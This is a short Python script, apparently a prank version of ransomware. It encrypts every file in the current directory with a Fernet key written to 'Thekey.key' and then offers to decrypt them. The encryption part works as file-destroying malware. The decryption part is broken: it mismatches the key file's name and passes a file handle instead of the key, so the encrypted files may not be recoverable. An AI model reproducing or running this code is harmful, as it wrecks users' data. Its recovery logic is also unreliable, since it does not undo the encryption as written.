
import os
from cryptography.fernet import Fernet
if input("are you sure, please dont run this (y/n)") != "y":
    exit()
files = []
for file in os.listdir():
        if file == "DO NOT RUN.py" or file == "Thekey.key":
            continue
        if os.path.isfile(file):
            files.append(file)
        
print(files)

key = Fernet.generate_key()
with open("Thekey.key","wb") as thekey:
    thekey.write(key)
for file in files:
    with open(file,"rb") as thefile:
        content = thefile.read()
    conten_e = Fernet(key).encrypt(content)
    with open(file,"wb") as thefile:
        thefile.write(conten_e)


if input("You fucking ran it didnt you(y/n)") == "y":
    files = []
    for file in os.listdir():
        if file == "DO NOT RUN.py" or file == "Thekey.key":
            continue
        if os.path.isfile(file):
            files.append(file)
    with open("thekey.key","rb") as key:
        secretk = key.read()
    for file in files:
        with open(file,"rb") as thefile:
            content = thefile.read()
        conten_de = Fernet(key).decrypt(content)
        with open(file,"wb") as thefile:
            thefile.write(conten_de)
    